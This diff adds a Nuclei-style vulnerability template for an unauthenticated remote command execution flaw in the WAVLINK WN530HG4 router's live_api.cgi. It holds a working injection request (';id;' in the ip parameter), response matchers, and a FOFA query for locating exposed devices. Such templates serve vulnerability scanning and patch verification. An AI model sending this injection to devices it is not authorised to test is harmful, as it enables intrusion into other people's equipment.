@@ -1,0 +1,29 @@
+id: wavlink-wn530hg4-live_api-cgi-rce
+
+info:
+  name: "WAVLINK-WN530HG4 live_api.cgi 远程命令执行漏洞"
+  author: NdayPoc
+  severity: high
+  description: |-
+    fofa: app="WAVLINK-WN530HG4" && body="wavlink"
+    WAVLINK-WN530HG4设备的live_api.cgi接口存在远程命令执行缺陷。攻击者无需身份验证即可利用此漏洞在目标服务器上执行任意系统命令，可能导致后门植入、服务器权限获取及Web服务被完全控制。鉴于该漏洞利用门槛较低，建议相关用户尽快实施修复措施。
+  reference:
+  - https://mp.weixin.qq.com/s/Oo_mgUei-yaR0WVxME953g
+  tags: WAVLINK
+
+http:
+- raw:
+  - |
+    GET /cgi-bin/live_api.cgi?page=oa5&id=2&ip=;id; HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "uid="
+    - "gid="
+    condition: and
+  - type: status
+    status:
+    - 200
